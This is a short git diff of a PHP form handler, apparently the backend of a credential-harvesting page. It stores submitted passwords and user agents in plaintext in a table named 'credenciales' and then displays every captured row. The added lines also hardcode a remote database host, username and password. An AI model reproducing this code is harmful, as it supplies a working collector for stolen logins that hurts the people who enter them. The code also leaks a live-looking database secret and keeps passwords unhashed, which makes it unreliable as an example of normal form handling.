@@ -8,7 +8,9 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     $password = $_POST['password'] ?? '';
     $userAgent = $_SERVER['HTTP_USER_AGENT'];
 
-    $conn = new mysqli("localhost", "root", "", "melissa");
+    // Conexión al host remoto
+    $conn = new mysqli("mysql-melissa.alwaysdata.net", "melissa_Meli", "MelissaMarquez1", "melissa_prueba");
+
     if ($conn->connect_error) {
         die("Error DB: " . $conn->connect_error);
     }
@@ -28,7 +30,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
 
     echo "<h3>Datos guardados correctamente.</h3>";
 
-    // Ahora mostramos todos los datos
+    // Mostrar todos los datos
     $result = $conn->query("SELECT id, correo, password, useragent, created_at FROM credenciales");
 
     if ($result->num_rows > 0) {
